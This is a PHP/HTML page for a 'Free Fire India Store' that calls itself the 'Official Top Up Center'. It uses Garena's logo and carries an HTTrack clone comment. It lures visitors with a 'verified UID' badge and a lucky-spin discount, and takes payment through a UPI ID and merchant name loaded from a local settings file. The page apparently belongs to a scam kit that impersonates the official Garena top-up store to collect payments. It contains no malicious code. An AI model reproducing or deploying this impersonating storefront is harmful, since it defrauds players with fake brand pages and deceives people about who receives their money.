<!DOCTYPE html>
<html lang="en">

<!-- /Added by HTTrack -->
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <meta name="description" content="Free Fire top-up store — diamonds, Booyah Pass, memberships and more." />
  <title>Free Fire India Store — UID Verified Rewards</title>
  <link rel="icon" type="image/png" href="garena-mark.png" />
  <link rel="apple-touch-icon" href="garena-mark.png" />
  <link rel="preconnect" href="https://fonts.googleapis.com/" />
  <link rel="preconnect" href="https://fonts.gstatic.com/" crossorigin />
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&amp;family=Russo+One&amp;display=swap" rel="stylesheet" />
  <link rel="stylesheet" href="css/styles.css?v=<?php echo time(); ?>" />
  <!-- UID discount is assigned after successful UID verification. -->
<script>
  try{if(localStorage.getItem('ff_theme')!=='light')document.documentElement.classList.add('dark');}catch(e){document.documentElement.classList.add('dark');}
  </script>
</head>
<body>
  <div class="bg-orbs" aria-hidden="true">
    <span class="orb orb-1"></span>
    <span class="orb orb-2"></span>
    <span class="orb orb-3"></span>
  </div>

  <!-- Header -->
  <header class="site-header" id="header">
    <div class="container header-inner">
      <a href="index.php" class="brand">
        <img src="garena-mark.png" alt="Garena" class="brand-logo" />
        <span class="brand-text">
          <strong>Official Top Up</strong>
          <small>Center</small>
        </span>
      </a>
      <nav class="main-nav" id="mainNav">
        <a href="index.php">Home</a>
        <a href="index.php#how">How it works</a>
        <a href="index.php#faq">FAQ</a>
      </nav>
      <button class="theme-toggle" id="themeToggle" aria-label="Toggle dark mode" title="Toggle theme">🌙</button>
      <button class="nav-toggle" id="navToggle" aria-label="Toggle menu">
        <span></span><span></span><span></span>
      </button>
    </div>
  </header>

  <!-- Large UID reward shown immediately after successful verification -->
  <section class="uid-reward-stage" aria-live="polite">
    <div class="uid-reward-card">
      <span class="uid-reward-eyebrow">🔥 FREE FIRE INDIA • VERIFIED UID REWARD</span>
      <div class="uid-reward-value"><span id="uidDiscount">SPIN TO WIN</span></div>
      <strong class="uid-reward-title">YOUR LUCKY REWARD</strong>
      <span class="uid-reward-copy">Spin the wheel after UID verification to unlock your offer</span>
      <span class="uid-reward-range">LUCKY SPIN • 0%–15% OFF</span>
    </div>
  </section>

  <!-- Verified account bar -->
  <section class="store-hero">
    <div class="container">
      <div class="verified-bar">
        <div class="vb-left">
          <div class="vb-avatar"><img src="g/icon.png" alt="Free Fire" /></div>
          <div class="vb-info">
            <span class="vb-label">Topping up for</span>
            <strong id="vNick">—</strong>
            <span class="vb-meta">UID <b id="vUid">—</b> · <span id="vLevel">—</span></span>
          </div>
          <span class="vb-badge">✓ Verified</span>\n          <span class="uid-discount-banner">🔥 <b id="uidDiscountBanner">0% OFF</b> · UID Discount Unlocked</span>
        </div>
        
      </div>
    </div>
  </section>

  <!-- Store -->
  <section class="products" id="products">
    <div class="container">
      <div class="section-head">
        <h2>Top Up <span class="grad">Centre</span></h2>
        <p>Pick a pack — delivered instantly to your verified account.</p>
      </div>

      <div class="tabs" id="tabs" role="tablist"><!-- injected by JS --></div>

      <div class="product-grid" id="productGrid"><!-- injected by JS --></div>
    </div>
  </section>

  <!-- Footer -->
  <footer class="footer">
    <div class="container footer-inner">
      <div>
        <a href="index.php" class="brand brand-footer">
          <img src="garena-mark.png" alt="Garena" class="brand-logo" />
          <span class="brand-text"><strong>Official Top Up</strong><small>Center</small></span>
        </a>
        <p class="muted">Genuine Free Fire top-ups, delivered instantly to your UID.</p>
      </div>
      <div class="footer-cols">
        <div><h4>Store</h4><a href="#products">Diamonds</a><a href="#products">Booyah Pass</a><a href="#products">Membership</a></div>
        <div><h4>Help</h4><a href="index.php#faq">FAQ</a><a href="index.php#how">How it works</a><a href="index.php">Home</a></div>
        <div><h4>Legal</h4><a href="#">Terms</a><a href="#">Privacy</a><a href="#">Refunds</a></div>
      </div>
    </div>
    <div class="container copyright">© <span id="year"></span> FireTopUp. All rights reserved.</div>
  </footer>

  <!-- Payment Modal (deep-link payment options) -->
  <div class="modal-overlay" id="payOverlay" hidden>
    <div class="modal modal-pay" role="dialog" aria-modal="true">
      <button class="modal-close" id="payClose" aria-label="Close">✕</button>
      <div class="modal-body" id="payBody"><!-- injected by JS --></div>
    </div>
  </div>

  <!-- Toast -->
  <div class="toast" id="toast" hidden></div>

  <?php
    $paymentSettings = json_decode((string)@file_get_contents(__DIR__.'/webinfo.json'), true) ?: [];
    $paymentPublic = ['merchantName'=>(string)($paymentSettings['merchant_name']??'Merchant'),'upi'=>(string)($paymentSettings['upi']??'')];
  ?>
  <script>window.PAYMENT_CONFIG = <?=json_encode($paymentPublic, JSON_HEX_TAG|JSON_HEX_APOS|JSON_HEX_QUOT|JSON_HEX_AMP)?>;</script>
  <script src="js/data.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/@twemoji/api@15.1.0/dist/twemoji.min.js" crossorigin="anonymous"></script>
  <script src="js/app.js?v=<?php echo @filemtime(__DIR__ . '/js/app.js') ?: time(); ?>"></script>
</body>

</html>
